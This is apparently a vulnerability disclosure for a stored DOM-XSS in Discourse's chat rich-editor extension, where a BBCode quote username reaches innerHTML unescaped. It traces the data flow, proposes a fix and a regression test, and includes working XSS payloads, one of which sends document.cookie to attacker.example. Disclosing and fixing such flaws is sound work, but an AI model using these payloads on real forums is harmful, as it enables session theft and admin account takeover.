# Stored DOM-XSS — `[chat]` BBCode `quote` username → `innerHTML` in Rich Editor extension

| | |
|---|---|
| **ID** | CHAT-RICHEDITOR-XSS-001 |
| **Class** | Stored DOM-XSS (HTML-injection into innerHTML in ProseMirror WYSIWYG editor) |
| **Track** | A (data-flow / source-to-sink) |
| **Sink** | `plugins/chat/assets/javascripts/lib/rich-editor-extension.js:75-78` |
| **Source** | `quote=` attribute on `[chat]` BBCode in the body of any user-authored post (`Post.raw`) |
| **Affected version** | Discourse `main` @ 06dfd48a17 (Jun 17 2026) with the bundled `chat` plugin enabled |
| **Severity (provisional)** | **High** — JS executes in another user's authenticated origin session; default site setting puts every user (including admins/mods) into the vulnerable editor mode |

## TL;DR

A low-privileged forum user can write a Markdown post containing a `[chat]` BBCode block whose `quote="…"` attribute carries arbitrary HTML in its first (`;`-separated) segment — for example:

```
[chat quote="<img src=x onerror=alert(document.domain)>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]
hi
[/chat]
```

The cooked HTML stored alongside the post is sanitized, so reading the topic in a normal browser session does **not** trigger the payload. However, the markdown **source** is preserved verbatim. When any user (most importantly an admin or moderator) loads that markdown into Discourse's **rich editor (ProseMirror WYSIWYG)** — by *editing the post*, by *quoting it*, or by *reopening their own draft* — the extension's `toDOM` callback concatenates `node.attrs.username` directly into an `innerHTML` template string:

```js
userElement.innerHTML = `
  <span class="chat-transcript-username">${node.attrs.username}</span>
  <span class="chat-transcript-datetime">${formattedDateTime}</span>
`;
```

The browser parses the resulting HTML, which now contains the attacker's `<img onerror=…>`, and the JavaScript runs in the victim's session on the Discourse origin.

Because `default_composition_mode = 1` (= `rich`, see `config/site_settings.yml:4197`), every new user account uses the WYSIWYG editor by default, so the only thing required for an admin to be compromised is to click the standard "Edit" pencil on the attacker's post.

## Affected code

### The sink — direct `innerHTML` interpolation

`plugins/chat/assets/javascripts/lib/rich-editor-extension.js:67-83`

```js
const userElement = document.createElement("div");
userElement.classList.add("chat-transcript-user");

const formattedDateTime = moment(node.attrs.datetime).format(
  i18n("dates.long_no_year")
);
userElement.innerHTML = `
  <span class="chat-transcript-username">${node.attrs.username}</span>
  <span class="chat-transcript-datetime">${formattedDateTime}</span>
`;
```

`node.attrs.username` is interpolated into a backtick-template-string and assigned to `innerHTML`. No escape / sanitisation / SafeString wrapper.

### The source — BBCode `quote="…"` attribute

`plugins/chat/assets/javascripts/lib/discourse-markdown/chat-transcript.js:19-20`

```js
const [username, messageIdStart, messageTimeStart] =
  (tagInfo.attrs.quote && tagInfo.attrs.quote.split(";")) || [];
```

`tagInfo.attrs.quote` is the value parsed from the BBCode `quote="…"` attribute. The BBCode tokenizer (`frontend/discourse-markdown-it/src/features/bbcode-block.js:85-88`) accepts **any** character inside double quotes (`"[^"]+"`), so `quote="<img src=x onerror=alert(1)>;1;2026"` is well-formed.

The first segment of the `;`-split — i.e. anything before the first semicolon — becomes `username`. It is then attached as-is to the markdown-it token (`chat-transcript.js:131`):

```js
wrapperDivToken.attrs.push(["data-username", username]);
```

The cooked-HTML renderer (when generating `Post.cooked`) `escapeHtml`s attribute values, so the **rendered output stored in `cooked`** is safe. But the same rule produces `html_inline` username output (`chat-transcript.js:201-202`) that survives untouched in the markdown-it token stream:

```js
const usernameToken = state.push("html_inline", "", 0);
usernameToken.content = displayName;
```

### The propagation path into the editor

`plugins/chat/assets/javascripts/lib/rich-editor-extension.js:186-202`

```js
state.openNode(state.schema.nodes.chat, {
  messageId: token.attrGet("data-message-id"),
  username: token.attrGet("data-username"),
  …
  html: messagesHtml,
  rawContent: token.content,
});
```

`token.attrGet("data-username")` returns the **raw, unescaped** string stored in the token. ProseMirror keeps that as `node.attrs.username` until `toDOM` interpolates it.

The path is reached every time the rich editor parses markdown back to a document — i.e.:

`frontend/discourse/app/static/prosemirror/components/prosemirror-editor.gjs:333-349`

```js
@bind
convertFromValue() {
  const value = this.args.value ?? "";
  …
  const doc = this.parser.convert(this.schema, value);
  const tr = this.view.state.tr;
  tr.replaceWith(0, this.view.state.doc.content.size, doc.content).setMeta(
    "addToHistory",
    false
  );
  …
}
```

`this.parser.convert(this.schema, value)` runs the markdown source through markdown-it and the per-extension `parse:` hooks, producing the ProseMirror document. When the view renders it, each chat node's `toDOM` is invoked and the unescaped `username` is injected into the live editor DOM.

## Why the standard defences do not stop it

1. **Cooked-HTML sanitiser (`xss`-based allow-list)** — only runs over `Post.cooked`. The rich-editor parses `Post.raw` directly, never the cooked output.
2. **Markdown-it attribute escaping** — escapes during HTML rendering, but the rich editor reads `token.attrGet(...)` *before* HTML rendering, getting the original raw value.
3. **`dReplaceEmoji` / `escapeExpression` wrappers** — already applied to `channel` (line 52, 62) and `threadTitle` (line 106-108). `username` was missed.
4. **Ember `htmlSafe` / `trustHTML` discipline** — this DOM write bypasses Glimmer entirely; the template literal is built and assigned to `Element.innerHTML` from a plain extension callback.

## Impact

* **JavaScript execution** on the Discourse origin with the victim's session cookies, CSRF token, and any preload data.
* If the victim is an **admin or moderator** (the practical "click pencil to edit" target), the attacker can:
  * Call admin API endpoints under the victim's session (create new admin users, change site settings, install themes/components which themselves execute JS for every visitor).
  * Pivot to full forum takeover.
* If the victim is a **normal user** who quotes/edits the malicious post in their own composer, the attacker can:
  * Steal their session and act as them (account takeover) via `fetch('/u/<them>/preferences/email', …)` style flows.

The attack only requires the ability to post Markdown — i.e., trust level 0/1 minimum on most Discourse installations.

## Reproduction (white-box trace)

Pre-condition: chat plugin enabled (default on most Discourse deployments that bundle chat), `default_composition_mode = 1` (default), victim has not opted out of the rich editor.

1. As any low-privileged user, create a post whose raw markdown is:

   ```
   [chat quote="<img src=x onerror=alert(document.domain)>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]
   hello
   [/chat]
   ```

2. Open the **same post** for editing in a session where `composition_mode = rich` (the default for all new users, including admin accounts created since the rich editor became default).

3. As the editor mounts:
   * `prosemirror-editor.gjs#convertFromValue` runs.
   * `Parser.convert(schema, raw)` tokenises the BBCode, runs the chat extension's `parse:` hook, builds a `chat` node with `username: '<img src=x onerror=alert(document.domain)>'`.
   * ProseMirror calls `toDOM(node)`; the template at `rich-editor-extension.js:75-78` is evaluated; the resulting string is assigned to `userElement.innerHTML`.
   * The HTML parser instantiates the `<img>`, fails to load `src=x`, fires `onerror`, executes `alert(document.domain)`.

4. Outcome: the alert (or any attacker JS in its place) runs in the victim's authenticated origin context.

## A representative end-to-end PoC (dynamic confirmation)

See `exploit.py` next to this finding — but a live, paste-into-browser equivalent of the body of the malicious post is:

```
[chat quote="<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>;1;2026-01-01T00:00:00Z" channel="x" channelId=1]
this looks like a normal forum reply
[/chat]
```

The cooked rendering on the topic page looks like a regular embedded "chat quote" card with a broken avatar and no execution. When an admin clicks the **Edit** pencil on that same post and the WYSIWYG editor loads, the `onerror` fires and the cookies are exfiltrated.

## Recommended fix

In `plugins/chat/assets/javascripts/lib/rich-editor-extension.js`, stop interpolating untrusted strings into `innerHTML`. Either:

* Build the user `<span>` nodes with `document.createElement` + `textContent` (preferred; mirrors how `node.attrs.threadTitle` is handled via `dReplaceEmoji` so emoji in usernames keeps working but raw HTML does not), **or**
* Escape the value: e.g.

  ```js
  import { escapeExpression } from "discourse/lib/utilities";
  …
  userElement.innerHTML = `
    <span class="chat-transcript-username">${escapeExpression(node.attrs.username)}</span>
    <span class="chat-transcript-datetime">${escapeExpression(formattedDateTime)}</span>
  `;
  ```

While in the area, audit the other interpolations in the same `toDOM`:

* `node.attrs.html` (line 82) is rendered from `customMarkdownCookFn(content)` which already passes through the sanitiser, so it is OK provided the sanitiser configuration in `customMarkdownCookFn` is correct.
* `node.attrs.threadHtml` (line 123) — same reasoning; sanitised by the same cook function.
* `node.attrs.threadTitle` (line 106-108) is wrapped in `dReplaceEmoji` which escapes — OK.
* `node.attrs.channel` is wrapped in `dReplaceEmoji` at line 52 and 62 — OK.

Only `username` (and arguably the rebuilt `bbCodeAttrs` in `serializeNode`, line 144, which has a separate quoting-escape bug but no DOM impact) is missing the escape.

A regression test analogous to the one in `plugins/chat/test/javascripts/components/rich-editor-extension-test.gjs` should assert that markdown like `[chat quote="<img src=x onerror=…>;1;…" …]…[/chat]` produces an `.chat-transcript-username` with `textContent === '<img src=x onerror=…>'` and **zero** `<img>` descendants.
